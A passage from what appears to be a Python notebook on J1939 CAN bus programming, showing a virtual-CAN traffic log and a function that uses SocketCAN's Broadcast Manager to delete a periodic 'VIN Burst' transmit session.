# (1682531948.829404) vcan1 18EB0006#0161626364656667
# (1682531948.829438) vcan1 18EC001F#20E806FDFF1FFE00
# (1682531948.830075) vcan1 18EB0007#0161626364656667
# (1682531948.830600) vcan1 18EC0020#20E806FDFF20FE00
# ...
#
# ```

# %%
#Delete the VIN Burst session
def delete_BCM(sa,da=0xFF,priority=6):
    can_id = 0x00EC0000 | socket.CAN_EFF_FLAG
    can_id |= (priority & 0x07) << 26
    can_id |= (da & 0xFF) << 8
    can_id |= (sa & 0xFF)
    
    print("deleting can_id = {:08X}".format(can_id))
    opcode = socket.CAN_BCM_TX_DELETE
    flags = 0
    count= 0 
    ival1_tv_sec=0
    ival1_tv_usec=0
    ival2_tv_sec=0
    ival2_tv_usec=0
    nframes=0
    bcm_frame = struct.pack(bcm_frame_format,
                            opcode,
                            flags,
                            count,
                            ival1_tv_sec,
                            ival1_tv_usec,
                            ival2_tv_sec,
                            ival2_tv_usec,
                            can_id,
                            nframes)
    # Send this only once. 
    sock.send(bcm_frame)

# %%
delete_BCM(3)
# Out:
# deleting can_id = 98ECFF03
